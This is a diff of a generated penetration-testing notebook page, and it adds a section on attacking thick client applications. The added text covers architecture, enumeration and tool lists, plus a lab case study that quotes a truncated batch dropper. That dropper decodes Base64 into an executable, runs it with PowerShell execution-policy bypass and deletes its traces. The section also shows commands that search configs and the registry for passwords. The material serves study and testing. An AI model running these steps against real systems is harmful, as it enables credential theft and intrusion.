@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-df557b97.js";
+            window.path_to_searchindex_js = "searchindex-5b860f22.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-da42f48c.js"></script>
+        <script src="toc-85f76174.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -21050,7 +21050,7 @@ ac
 <h3 id="htb"><a class="header" href="#htb">HTB</a></h3>
 <ul>
 <li><a href="#hydra">Brute Forcing</a></li>
-<li><a href="#enumeration-methodology-1">Enumeration Methodology (Footprinting)</a></li>
+<li><a href="#enumeration-methodology-2">Enumeration Methodology (Footprinting)</a></li>
 </ul>
 <h3 id="linux"><a class="header" href="#linux">Linux</a></h3>
 <ul>
@@ -25960,6 +25960,16 @@ SQL&gt; xp_cmdshell whoami /priv
 </ul>
 </li>
 </ul>
+<h3 id="thick-client-applications"><a class="header" href="#thick-client-applications">Thick Client Applications</a></h3>
+<ul>
+<li><a href="infosec/attacking-common-applications/thick-client">Thick Client Applications — discovery, enumeration, reverse engineering, hardcoded credentials, DLL hijacking</a>
+<ul>
+<li><a href="#thick-client-applications--discovery--enumeration">Discovery &amp; Enumeration — application identification, metadata extraction, dependency analysis, static analysis, configuration discovery</a></li>
+<li><a href="#attacking-thick-client-applications">Attacking Thick Client Applications — hardcoded credentials extraction, static/dynamic analysis, case study, DLL hijacking, insecure storage exploitation</a></li>
+<li><a href="#exploiting-web-vulnerabilities-in-thick-client-applications">Exploiting Web Vulnerabilities — SQL injection, path traversal, JAR modification, signature bypass, three-tier architecture attacks</a></li>
+</ul>
+</li>
+</ul>
 <h3 id="prtg-network-monitor"><a class="header" href="#prtg-network-monitor">PRTG Network Monitor</a></h3>
 <ul>
 <li><a href="infosec/attacking-common-applications/prtg">PRTG Network Monitor — discovery &amp; enumeration, CVE-2018-9276 command injection, default credentials, persistence</a>
@@ -28167,14 +28177,1157 @@ index=* source="*access.log*" | head 50
 <li><input disabled="" type="checkbox"> Confirm Python is available (it always is — bundled with Splunk)</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="tomcat-1"><a class="header" href="#tomcat-1">Tomcat</a></h1>
+<h1 id="thick-client-applications-1"><a class="header" href="#thick-client-applications-1">Thick Client Applications</a></h1>
 <h2 id="directory-map-21"><a class="header" href="#directory-map-21">Directory map</a></h2>
+<ul>
+<li><a href="#thick-client-applications--discovery--enumeration">Thick Client — Discovery &amp; Enumeration — application identification, metadata extraction, dependency analysis, configuration file discovery, backend communication identification</a></li>
+<li><a href="#attacking-thick-client-applications">Attacking Thick Client Applications — hardcoded credentials extraction, DLL hijacking, insecure storage exploitation, network MITM, case study credential extraction</a></li>
+<li><a href="#exploiting-web-vulnerabilities-in-thick-client-applications">Exploiting Web Vulnerabilities in Thick-Client Applications — SQL injection, path traversal, JAR modification, signature bypass, privilege escalation</a></li>
+</ul>
+<h2 id="summary-11"><a class="header" href="#summary-11">Summary</a></h2>
+<p>Thick client applications are locally installed software that perform significant processing on the client side, with dependencies on backend servers or databases. Unlike web applications, they execute with the user’s privileges and have direct access to local file systems, registry, and network.</p>
+<p><strong>Characteristics:</strong></p>
+<ul>
+<li><strong>Locally installed</strong> — Execute with user privileges</li>
+<li><strong>Process independently</strong> — Don’t require web browser</li>
+<li><strong>Complex attack surface</strong> — Multiple exploitation vectors</li>
+<li><strong>Often unpatched</strong> — Enterprise deployments lag security updates</li>
+<li><strong>Legacy technologies</strong> — Built with outdated frameworks/patterns</li>
+<li><strong>Credentials locally stored</strong> — Hardcoded or insecurely cached</li>
+</ul>
+<p><strong>Common frameworks:</strong></p>
+<ul>
+<li>.NET (Windows-focused)</li>
+<li>Java (cross-platform)</li>
+<li>C/C++ (performance-critical, system-level access)</li>
+<li>Python (compiled to .exe)</li>
+<li>Silverlight (legacy, deprecated)</li>
+</ul>
+<p><strong>Vulnerability landscape:</strong></p>
+<ul>
+<li><strong>Hardcoded credentials</strong> — Passwords in source code (CRITICAL)</li>
+<li><strong>Improper error handling</strong> — Stack traces reveal system information</li>
+<li><strong>DLL hijacking</strong> — Load attacker-controlled DLLs for code execution</li>
+<li><strong>Buffer overflow</strong> — Memory corruption leading to RCE</li>
+<li><strong>SQL injection</strong> — Direct database access via unvalidated queries</li>
+<li><strong>Insecure storage</strong> — Plaintext or weakly encrypted local data</li>
+<li><strong>Weak session management</strong> — Predictable tokens, session fixation</li>
+<li><strong>Unencrypted communication</strong> — MITM attacks for credential theft</li>
+</ul>
+<p><strong>Architecture patterns:</strong></p>
+<ol>
+<li>
+<p><strong>Two-tier:</strong> Client ↔ Database (direct)</p>
+<ul>
+<li>Higher risk: Database credentials in client</li>
+<li>Attacker can connect directly to database</li>
+</ul>
+</li>
+<li>
+<p><strong>Three-tier:</strong> Client ↔ Application Server ↔ Database</p>
+<ul>
+<li>Better security: Database protected by application server</li>
+<li>Still vulnerable if application server is compromised</li>
+</ul>
+</li>
+</ol>
+<p><strong>Common scenarios:</strong></p>
+<ul>
+<li>Enterprise project management / CRM systems</li>
+<li>Inventory management applications</li>
+<li>Financial/banking software</li>
+<li>Manufacturing control systems</li>
+<li>System administration tools</li>
+<li>Custom business applications</li>
+</ul>
+<p><strong>Post-exploitation value:</strong></p>
+<ul>
+<li>Access to backend databases</li>
+<li>Extraction of system credentials</li>
+<li>Pivot point for network lateral movement</li>
+<li>Information for further social engineering</li>
+<li>Access to production systems (if application integrates)</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="attacking-thick-client-applications"><a class="header" href="#attacking-thick-client-applications">Attacking Thick Client Applications</a></h1>
+<p>Thick client applications (also called rich or fat clients) are locally installed applications that perform significant processing on the client side rather than relying solely on remote servers. Unlike web applications, they don’t require internet access and can contain significant attack surface including hardcoded credentials, unencrypted communications, and insecure local storage.</p>
+<hr>
+<h2 id="thick-client-architecture"><a class="header" href="#thick-client-architecture">Thick Client Architecture</a></h2>
+<h3 id="two-tier-architecture"><a class="header" href="#two-tier-architecture">Two-Tier Architecture</a></h3>
+<pre><code>┌─────────────────┐
+│  Thick Client   │
+│  (Application)  │
+└────────┬────────┘
+         │
+         │ Direct connection
+         ↓
+┌─────────────────┐
+│    Database     │
+└─────────────────┘
+</code></pre>
+<p><strong>Risk:</strong> Attacker can directly communicate with database; credentials embedded in client.</p>
+<h3 id="three-tier-architecture"><a class="header" href="#three-tier-architecture">Three-Tier Architecture</a></h3>
+<pre><code>┌─────────────────┐
+│  Thick Client   │
+│  (Application)  │
+└────────┬────────┘
+         │
+         │ HTTP/HTTPS
+         ↓
+┌─────────────────┐
+│   Application   │
+│     Server      │
+└────────┬────────┘
+         │
+         │
+         ↓
+┌─────────────────┐
+│    Database     │
+└─────────────────┘
+</code></pre>
+<p><strong>Risk:</strong> Better security; database not directly accessible, but application server may be exploitable.</p>
+<hr>
+<h2 id="common-vulnerabilities-in-thick-clients"><a class="header" href="#common-vulnerabilities-in-thick-clients">Common Vulnerabilities in Thick Clients</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Vulnerability</th><th>Impact</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td>Hardcoded credentials</td><td>Complete compromise</td><td>Database password in source code</td></tr>
+<tr><td>Improper error handling</td><td>Information disclosure</td><td>Stack traces revealing system paths</td></tr>
+<tr><td>DLL hijacking</td><td>Code execution</td><td>Malicious DLL loaded instead of legitimate</td></tr>
+<tr><td>Buffer overflow</td><td>Code execution, DoS</td><td>Stack or heap overflow</td></tr>
+<tr><td>SQL injection</td><td>Data breach, code execution</td><td>Direct SQL queries to database</td></tr>
+<tr><td>Insecure storage</td><td>Credential theft</td><td>Passwords stored in plaintext files</td></tr>
+<tr><td>Weak session management</td><td>Session hijacking</td><td>Predictable session tokens</td></tr>
+<tr><td>Unencrypted communication</td><td>MITM attacks, credential theft</td><td>HTTP or unencrypted TCP</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="penetration-testing-phases"><a class="header" href="#penetration-testing-phases">Penetration Testing Phases</a></h2>
+<h3 id="phase-1-information-gathering"><a class="header" href="#phase-1-information-gathering">Phase 1: Information Gathering</a></h3>
+<p><strong>Identify application architecture:</strong></p>
+<ul>
+<li>Is it two-tier or three-tier?</li>
+<li>What’s the backend server (if any)?</li>
+<li>What database is used?</li>
+</ul>
+<p><strong>Identify technologies:</strong></p>
+<pre><code class="language-bash"># Use CFF Explorer to analyze PE headers
+# Detect It Easy for quick analysis
+# Strings utility to find embedded information
+strings application.exe | grep -i "version\|database\|server"
+</code></pre>
+<p><strong>Identify entry points:</strong></p>
+<ul>
+<li>User input fields</li>
+<li>File operations</li>
+<li>Network communications</li>
+<li>Registry access</li>
+</ul>
+<p><strong>Tools:</strong></p>
+<ul>
+<li><strong>CFF Explorer</strong> — PE file analysis</li>
+<li><strong>Detect It Easy</strong> — Quick binary analysis</li>
+<li><strong>Process Monitor</strong> — Monitor runtime behavior</li>
+<li><strong>Strings</strong> — Extract readable text from binaries</li>
+</ul>
+<h3 id="phase-2-client-side-attacks"><a class="header" href="#phase-2-client-side-attacks">Phase 2: Client-Side Attacks</a></h3>
+<h4 id="static-analysis"><a class="header" href="#static-analysis">Static Analysis</a></h4>
+<p>Reverse-engineer the application to find hardcoded credentials:</p>
+<pre><code class="language-bash"># For .NET applications
+dnspy application.exe    # Decompile and inspect source code
+
+# For Java applications
+jd-gui application.jar   # Decompile JAR files
+
+# For native binaries
+ida application.exe      # IDA Pro for advanced analysis
+ghidra application.exe   # Ghidra (free alternative)
+</code></pre>
+<p><strong>Look for:</strong></p>
+<ul>
+<li>Hardcoded database credentials</li>
+<li>API keys and tokens</li>
+<li>Server URLs and hostnames</li>
+<li>Encryption keys</li>
+<li>Username/password patterns</li>
+</ul>
+<h4 id="dynamic-analysis"><a class="header" href="#dynamic-analysis">Dynamic Analysis</a></h4>
+<p>Monitor application execution to capture sensitive data:</p>
+<pre><code class="language-bash"># Monitor registry access
+procmon.exe              # Process Monitor (SysInternals)
+
+# Debugging and inspection
+x64dbg                   # 64-bit debugger
+ollydbg                  # 32-bit debugger
+radare2                  # Portable disassembler/debugger
+
+# Memory analysis
+frida                    # Dynamic instrumentation toolkit
+volatility               # Memory forensics
+</code></pre>
+<p><strong>Technique: Extract Credentials from Memory</strong></p>
+<ol>
+<li>Attach debugger to running application</li>
+<li>Set breakpoints at authentication functions</li>
+<li>Inspect memory for plaintext passwords/credentials</li>
+<li>Extract and decode Base64/encrypted values</li>
+</ol>
+<h3 id="phase-3-network-side-attacks"><a class="header" href="#phase-3-network-side-attacks">Phase 3: Network-Side Attacks</a></h3>
+<p>Analyze network traffic between client and server:</p>
+<pre><code class="language-bash"># Capture traffic
+wireshark                # GUI packet analyzer
+tcpdump                  # Command-line packet capture
+netsh trace              # Windows native tracing
+
+# Analyze traffic
+burp suite               # Intercept and analyze HTTP/HTTPS
+tcpview                  # View active TCP/UDP connections
+fiddler                  # HTTP(S) traffic interception
+</code></pre>
+<p><strong>Vulnerability examples:</strong></p>
+<ul>
+<li>Credentials transmitted in cleartext</li>
+<li>No certificate validation (MITM possible)</li>
+<li>Unencrypted database connections</li>
+<li>Predictable request patterns</li>
+</ul>
+<h3 id="phase-4-server-side-attacks"><a class="header" href="#phase-4-server-side-attacks">Phase 4: Server-Side Attacks</a></h3>
+<p>Target the application server or database:</p>
+<pre><code class="language-bash"># Common server-side attacks
+sqlmap                   # SQL injection testing
+burp suite               # Web application testing framework
+metasploit               # Exploitation framework
+</code></pre>
+<p><strong>Attack vectors:</strong></p>
+<ul>
+<li>SQL injection</li>
+<li>Authentication bypass</li>
+<li>Privilege escalation</li>
+<li>Business logic flaws</li>
+<li>API vulnerabilities</li>
+</ul>
+<hr>
+<h2 id="extracting-hardcoded-credentials---case-study"><a class="header" href="#extracting-hardcoded-credentials---case-study">Extracting Hardcoded Credentials - Case Study</a></h2>
+<h3 id="scenario-restart-oracleserviceexe"><a class="header" href="#scenario-restart-oracleserviceexe">Scenario: Restart-OracleService.exe</a></h3>
+<p><strong>Initial discovery:</strong> Application found in SMB NETLOGON share.</p>
+<h3 id="step-1-identify-hidden-behavior"><a class="header" href="#step-1-identify-hidden-behavior">Step 1: Identify Hidden Behavior</a></h3>
+<pre><code class="language-bash"># Run the application
+C:\Apps&gt;.\Restart-OracleService.exe
+C:\Apps&gt;
+
+# Use Process Monitor to capture file operations
+# Monitor C:\Users\[user]\AppData\Local\Temp
+# Look for temporary files created and deleted
+</code></pre>
+<p><strong>Finding:</strong> Application creates temporary batch files and deletes them immediately.</p>
+<h3 id="step-2-prevent-file-deletion"><a class="header" href="#step-2-prevent-file-deletion">Step 2: Prevent File Deletion</a></h3>
+<p>Modify TEMP folder permissions to prevent deletion:</p>
+<pre><code>C:\Users\[user]\AppData\Local\Temp
+→ Right-click → Properties → Security → Advanced
+→ Edit [user] permissions
+→ Uncheck "Delete subfolders and files" and "Delete"
+→ Apply
+</code></pre>
+<h3 id="step-3-capture-generated-files"><a class="header" href="#step-3-capture-generated-files">Step 3: Capture Generated Files</a></h3>
+<p>Run application again and check TEMP folder:</p>
+<pre><code class="language-cmd">C:\&gt;dir C:\Users\[user]\AppData\Local\Temp\2
+04/03/2023  02:09 PM         1,730,212 6F39.bat
+04/03/2023  02:09 PM                 0 6F39.tmp
+</code></pre>
+<h3 id="step-4-analyze-batch-file"><a class="header" href="#step-4-analyze-batch-file">Step 4: Analyze Batch File</a></h3>
+<pre><code class="language-batch">@shift /0
+@echo off
+
+if %username% == matt goto correcto
+if %username% == frankytech goto correcto
+if %username% == ev4si0n goto correcto
+goto error
+
+:correcto
+# Outputs Base64-encoded binary to file
+echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAA... &gt; c:\programdata\oracle.txt
+# More Base64 lines appended...
+
+# PowerShell script to decode Base64
+echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) &gt; c:\programdata\monta.ps1
+
+powershell.exe -exec bypass -file c:\programdata\monta.ps1
+del c:\programdata\monta.ps1
+del c:\programdata\oracle.txt
+c:\programdata\restart-service.exe
+del c:\programdata\restart-service.exe
+</code></pre>
+<p><strong>Key insight:</strong> Application drops and executes a binary, then cleans up traces.</p>
+<h3 id="step-5-preserve-dropped-files"><a class="header" href="#step-5-preserve-dropped-files">Step 5: Preserve Dropped Files</a></h3>
+<p>Modify batch file to prevent deletion:</p>
+<pre><code class="language-batch">@shift /0
+@echo off
+
+echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAA... &gt; c:\programdata\oracle.txt
+echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g &gt;&gt; c:\programdata\oracle.txt
+# ... more Base64 lines ...
+
+echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) &gt; c:\programdata\monta.ps1
+
+# Comment out deletion commands
+REM del c:\programdata\monta.ps1
+REM del c:\programdata\oracle.txt
+c:\programdata\restart-service.exe
+REM del c:\programdata\restart-service.exe
+</code></pre>
+<h3 id="step-6-execute-modified-batch"><a class="header" href="#step-6-execute-modified-batch">Step 6: Execute Modified Batch</a></h3>
+<p>Files now remain in <code>C:\ProgramData\</code>:</p>
+<pre><code class="language-cmd">C:\&gt;ls C:\ProgramData\
+
+Mode                LastWriteTime         Length Name
+-a----        3/24/2023   1:01 PM            273 monta.ps1
+-a----        3/24/2023   1:01 PM         601066 oracle.txt
+-a----        3/24/2023   1:17 PM         432273 restart-service.exe
+</code></pre>
+<h3 id="step-7-debug-the-extracted-binary"><a class="header" href="#step-7-debug-the-extracted-binary">Step 7: Debug the Extracted Binary</a></h3>
+<p>Use x64dbg to analyze the executable:</p>
+<pre><code>1. Open x64dbg
+2. File → Open → select restart-service.exe
+3. Options → Preferences → Uncheck all except "Exit Breakpoint"
+4. Right-click in CPU view → Follow in Memory Map
+5. Look for suspicious memory regions (RW-- protection)
+6. Double-click interesting regions (look for MZ magic bytes)
+7. Right-click → Dump Memory to File
+</code></pre>
+<h3 id="step-8-extract-and-analyze-memory-dump"><a class="header" href="#step-8-extract-and-analyze-memory-dump">Step 8: Extract and Analyze Memory Dump</a></h3>
+<pre><code class="language-bash"># Run strings on exported dump
+strings restart-service_00000000001E0000.bin | grep -i "oracle\|password\|user"
+
+# Output shows .NET Framework references
+.NETFramework,Version=v4.0,Profile=Client
+.NET Framework 4 Client Profile
+</code></pre>
+<h3 id="step-9-deobfuscate-net-binary"><a class="header" href="#step-9-deobfuscate-net-binary">Step 9: Deobfuscate .NET Binary</a></h3>
+<p>Use de4dot to remove obfuscation:</p>
+<pre><code class="language-bash">de4dot restart-service_00000000001E0000.bin
+# Outputs: restart-service_00000000001E0000-cleaned.bin
+</code></pre>
+<h3 id="step-10-decompile-with-dnspy"><a class="header" href="#step-10-decompile-with-dnspy">Step 10: Decompile with dnSpy</a></h3>
+<pre><code>1. Open dnSpy
+2. File → Open → select restart-service_00000000001E0000-cleaned.bin
+3. Browse decompiled C# source code
+4. Look for hardcoded credentials and business logic
+</code></pre>
+<p><strong>Result:</strong> Discover custom <code>runas.exe</code> implementation with hardcoded Oracle service credentials.</p>
+<hr>
+<h2 id="tools-summary-4"><a class="header" href="#tools-summary-4">Tools Summary</a></h2>
+<h3 id="static-analysis-1"><a class="header" href="#static-analysis-1">Static Analysis</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Purpose</th><th>Supported</th></tr>
+</thead>
+<tbody>
+<tr><td>IDA Pro</td><td>Disassembly and decompilation</td><td>EXE, DLL, binaries</td></tr>
+<tr><td>Ghidra</td><td>Free disassembly/decompilation</td><td>EXE, DLL, binaries</td></tr>
+<tr><td>dnSpy</td><td>.NET decompilation</td><td>EXE, DLL (managed)</td></tr>
+<tr><td>JADX</td><td>Java decompilation</td><td>APK, JAR, DEX</td></tr>
+<tr><td>Radare2</td><td>Portable disassembler</td><td>EXE, DLL, binaries</td></tr>
+<tr><td>Strings</td><td>Extract readable text</td><td>Any binary</td></tr>
+<tr><td>CFF Explorer</td><td>PE file analysis</td><td>EXE, DLL</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="dynamic-analysis-1"><a class="header" href="#dynamic-analysis-1">Dynamic Analysis</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td>Process Monitor</td><td>Monitor system calls</td></tr>
+<tr><td>x64dbg</td><td>64-bit debugging</td></tr>
+<tr><td>ollydbg</td><td>32-bit debugging</td></tr>
+<tr><td>WinDbg</td><td>Windows debugging</td></tr>
+<tr><td>Frida</td><td>Dynamic instrumentation</td></tr>
+<tr><td>Volatility</td><td>Memory forensics</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="network-analysis"><a class="header" href="#network-analysis">Network Analysis</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td>Wireshark</td><td>Packet capture and analysis</td></tr>
+<tr><td>Burp Suite</td><td>HTTP(S) interception</td></tr>
+<tr><td>Fiddler</td><td>HTTP proxy</td></tr>
+<tr><td>tcpdump</td><td>CLI packet capture</td></tr>
+<tr><td>Telerik Fiddler</td><td>HTTP debugging</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="hardcoded-credentials-common-locations"><a class="header" href="#hardcoded-credentials-common-locations">Hardcoded Credentials Common Locations</a></h2>
+<p><strong>In source code/binaries:</strong></p>
+<ul>
+<li>Database connection strings</li>
+<li>API keys and tokens</li>
+<li>Service account credentials</li>
+<li>Encryption keys</li>
+<li>OAuth tokens</li>
+</ul>
+<p><strong>In configuration files:</strong></p>
+<ul>
+<li><code>config.ini</code>, <code>config.xml</code>, <code>app.config</code></li>
+<li><code>web.config</code> (ASP.NET)</li>
+<li><code>.properties</code> files (Java)</li>
+<li>Registry keys (Windows)</li>
+<li>INI files in program directory</li>
+</ul>
+<p><strong>In memory:</strong></p>
+<ul>
+<li>Decrypted passwords during execution</li>
+<li>Session tokens</li>
+<li>Encryption keys</li>
+<li>API responses with sensitive data</li>
+</ul>
+<p><strong>In temporary files:</strong></p>
+<ul>
+<li>Batch files created during execution</li>
+<li>Log files with debug output</li>
+<li>Cache files with plaintext data</li>
+<li>Installation files</li>
+</ul>
+<hr>
+<h2 id="assessment-checklist-2"><a class="header" href="#assessment-checklist-2">Assessment Checklist</a></h2>
+<ul>
+<li><input disabled="" type="checkbox"> Identify application architecture (two-tier/three-tier)</li>
+<li><input disabled="" type="checkbox"> Perform static analysis (decompile source code)</li>
+<li><input disabled="" type="checkbox"> Search for hardcoded credentials in binaries</li>
+<li><input disabled="" type="checkbox"> Check configuration files for sensitive data</li>
+<li><input disabled="" type="checkbox"> Monitor runtime behavior with Process Monitor</li>
+<li><input disabled="" type="checkbox"> Capture and analyze network traffic</li>
+<li><input disabled="" type="checkbox"> Intercept HTTP(S) communications</li>
+<li><input disabled="" type="checkbox"> Test for SQL injection in local database calls</li>
+<li><input disabled="" type="checkbox"> Analyze memory dumps for credentials/keys</li>
+<li><input disabled="" type="checkbox"> Test for DLL hijacking vulnerabilities</li>
+<li><input disabled="" type="checkbox"> Check for improper error handling</li>
+<li><input disabled="" type="checkbox"> Test authentication mechanisms</li>
+<li><input disabled="" type="checkbox"> Document all findings with proof-of-concept</li>
+</ul>
+<hr>
+<h2 id="key-takeaways-9"><a class="header" href="#key-takeaways-9">Key Takeaways</a></h2>
+<ul>
+<li><strong>Thick clients are complex:</strong> Multiple attack surfaces (client, network, server)</li>
+<li><strong>Hardcoded credentials common:</strong> Source code and binaries frequently contain secrets</li>
+<li><strong>Local access dangerous:</strong> Full control of the application logic</li>
+<li><strong>Network traffic unencrypted:</strong> Monitor for plaintext credentials and data</li>
+<li><strong>Debugging access:</strong> Ability to inspect runtime memory and logic</li>
+<li><strong>File extraction:</strong> Temporary files may reveal dropped/executed code</li>
+<li><strong>Decompilation possible:</strong> .NET and Java applications easily reversible</li>
+<li><strong>Default behaviors exploitable:</strong> Many applications designed without security in mind</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="thick-client-applications--discovery--enumeration"><a class="header" href="#thick-client-applications--discovery--enumeration">Thick Client Applications — Discovery &amp; Enumeration</a></h1>
+<p>Thick client applications are locally installed software that perform significant processing on the client side. They present a large attack surface including hardcoded credentials, local data storage, and client-to-server communications that may be unencrypted or improperly validated.</p>
+<hr>
+<h2 id="identifying-thick-client-applications"><a class="header" href="#identifying-thick-client-applications">Identifying Thick Client Applications</a></h2>
+<h3 id="on-user-workstations"><a class="header" href="#on-user-workstations">On User Workstations</a></h3>
+<p><strong>Common locations:</strong></p>
+<pre><code>C:\Program Files\
+C:\Program Files (x86)\
+C:\Users\[username]\AppData\Local\
+C:\Users\[username]\AppData\Roaming\
+C:\Users\[username]\Desktop\
+%ProgramData%\
+</code></pre>
+<p><strong>Identify via:</strong></p>
+<pre><code class="language-powershell"># List installed programs
+Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
+  Select-Object DisplayName, InstallLocation
+
+# Find executables
+dir C:\Program Files\ -Filter *.exe -Recurse
+
+# Check for custom applications
+dir C:\Users\[username]\AppData\ -Filter *.exe -Recurse
+</code></pre>
+<h3 id="on-network-shares"><a class="header" href="#on-network-shares">On Network Shares</a></h3>
+<p>Thick client applications are often deployed via:</p>
+<pre><code>\\server\netlogon\           # NETLOGON share
+\\server\sysvol\             # SYSVOL share
+\\server\apps\               # Application share
+\\server\deployments\        # Deployment share
+</code></pre>
+<p><strong>Discovery:</strong></p>
+<pre><code class="language-bash"># SMB enumeration
+smbmap -H target.com -u user -p password
+net view \\target.com\
+
+# Mount and browse shares
+mount -t cifs \\target.com\netlogon /mnt/share -o user=username,password=password
+ls -la /mnt/share/
+</code></pre>
+<hr>
+<h2 id="enumeration-methodology"><a class="header" href="#enumeration-methodology">Enumeration Methodology</a></h2>
+<h3 id="step-1-identify-application-type"><a class="header" href="#step-1-identify-application-type">Step 1: Identify Application Type</a></h3>
+<p><strong>File signature analysis:</strong></p>
+<pre><code class="language-bash"># Check file type
+file application.exe
+# Output: EXE, PE 32/64-bit executable
+
+# Read PE headers
+CFF Explorer application.exe
+# Look for: .NET assemblies, imports, resources
+
+# Identify framework
+strings application.exe | grep -i ".net\|java\|framework"
+</code></pre>
+<p><strong>Common application types:</strong></p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Framework</th><th>Extension</th><th>Tools</th></tr>
+</thead>
+<tbody>
+<tr><td>.NET</td><td>.exe, .dll</td><td>dnSpy, de4dot, Reflector</td></tr>
+<tr><td>Java</td><td>.jar, .war</td><td>jd-gui, CFR, procyon</td></tr>
+<tr><td>C/C++</td><td>.exe, .dll</td><td>IDA, Ghidra, x64dbg</td></tr>
+<tr><td>Python</td><td>.exe (compiled)</td><td>uncompyle6, decompyle3</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="step-2-extract-metadata"><a class="header" href="#step-2-extract-metadata">Step 2: Extract Metadata</a></h3>
+<p><strong>Binary metadata:</strong></p>
+<pre><code class="language-bash"># Get file information
+file application.exe
+exiftool application.exe
+wmic datafile where name="C:\\path\\application.exe" get Description,Version
+
+# Read embedded strings
+strings application.exe | head -50
+strings -e l application.exe  # Unicode strings
+
+# Look for important information
+strings application.exe | grep -i "version\|copyright\|product"
+</code></pre>
+<p><strong>Version detection:</strong></p>
+<pre><code class="language-powershell"># Get file version from properties
+[System.Diagnostics.FileVersionInfo]::GetVersionInfo("C:\path\application.exe")
+
+# Check version info
+(Get-Item C:\path\application.exe).VersionInfo
+</code></pre>
+<h3 id="step-3-identify-dependencies"><a class="header" href="#step-3-identify-dependencies">Step 3: Identify Dependencies</a></h3>
+<p><strong>Understand what the application needs:</strong></p>
+<pre><code class="language-bash"># Analyze PE imports
+CFF Explorer application.exe → Imports section
+
+# Check DLL dependencies
+dumpbin /imports application.exe
+objdump -x application.exe
+
+# Monitor in Process Monitor
+procmon.exe → Filter for application.exe
+</code></pre>
+<p><strong>Look for:</strong></p>
+<ul>
+<li>Database drivers (ODBC, MySQL, PostgreSQL, SQL Server)</li>
+<li>Web service libraries (HTTP, SOAP, REST)</li>
+<li>Cryptography libraries (OpenSSL, BoringSSL)</li>
+<li>Authentication libraries (LDAP, Kerberos)</li>
+</ul>
+<h3 id="step-4-static-analysis-for-entry-points"><a class="header" href="#step-4-static-analysis-for-entry-points">Step 4: Static Analysis for Entry Points</a></h3>
+<p>Identify user-controlled inputs:</p>
+<pre><code class="language-bash"># Decompile .NET application
+dnspy application.exe
+# Look for: Form_Load, button_Click, textBox_TextChanged events
+
+# Analyze C/C++ binary
+ida application.exe
+# Search for: strcpy, sprintf, scanf functions
+
+# Java analysis
+jd-gui application.jar
+# Look for: ActionListener, KeyListener, input handlers
+</code></pre>
+<p><strong>Common entry points:</strong></p>
+<ul>
+<li>Text input fields</li>
+<li>File upload dialogs</li>
+<li>Network request handlers</li>
+<li>Configuration file parsers</li>
+<li>Command execution functions</li>
+</ul>
+<h3 id="step-5-identify-backend-communications"><a class="header" href="#step-5-identify-backend-communications">Step 5: Identify Backend Communications</a></h3>
+<p><strong>Analyze network behavior:</strong></p>
+<pre><code class="language-bash"># Monitor network connections
+netstat -ano | findstr "application.exe"
+tcpview.exe
+
+# Capture traffic
+wireshark → Filter by application.exe process
+netsh trace start capture=yes
+
+# Check for hardcoded URLs
+strings application.exe | grep -E "http://|https://|\.com|\.local"
+</code></pre>
+<p><strong>Look for:</strong></p>
+<ul>
+<li>Server hostnames/IPs</li>
+<li>Port numbers</li>
+<li>API endpoints</li>
+<li>Database connection strings</li>
+<li>Service URLs</li>
+</ul>
+<h3 id="step-6-check-configuration-files"><a class="header" href="#step-6-check-configuration-files">Step 6: Check Configuration Files</a></h3>
+<p>Applications often store settings locally:</p>
+<pre><code>application.exe.config       # .NET configuration
+app.properties               # Java properties
+config.ini, config.xml       # Generic config
+settings.json                # JSON configuration
+Registry keys (Windows)      # HKEY_LOCAL_MACHINE\Software\...
+</code></pre>
+<p><strong>Parse configuration files:</strong></p>
+<pre><code class="language-bash"># .NET config file
+cat application.exe.config | grep -i "connectionstring\|password"
+
+# Java properties
+grep -i "password\|username\|host" application.properties
+
+# Registry dump
+reg export HKLM\Software\Company\Application config.reg
+cat config.reg | findstr "password"
+</code></pre>
+<hr>
+<h2 id="common-vulnerability-patterns"><a class="header" href="#common-vulnerability-patterns">Common Vulnerability Patterns</a></h2>
+<h3 id="hardcoded-credentials"><a class="header" href="#hardcoded-credentials">Hardcoded Credentials</a></h3>
+<p><strong>Search in decompiled code:</strong></p>
+<pre><code class="language-csharp">// .NET examples
+private string password = "P@ssw0rd123";
+string connString = "Server=db.local;User=sa;Password=hardcoded";
+</code></pre>
+<pre><code class="language-java">// Java examples
+String apiKey = "sk-1234567890abcdef";
+String dbPassword = "mysql_root_password";
+</code></pre>
+<h3 id="unencrypted-communications"><a class="header" href="#unencrypted-communications">Unencrypted Communications</a></h3>
+<p><strong>Identify during traffic analysis:</strong></p>
+<pre><code>HTTP (not HTTPS) communications
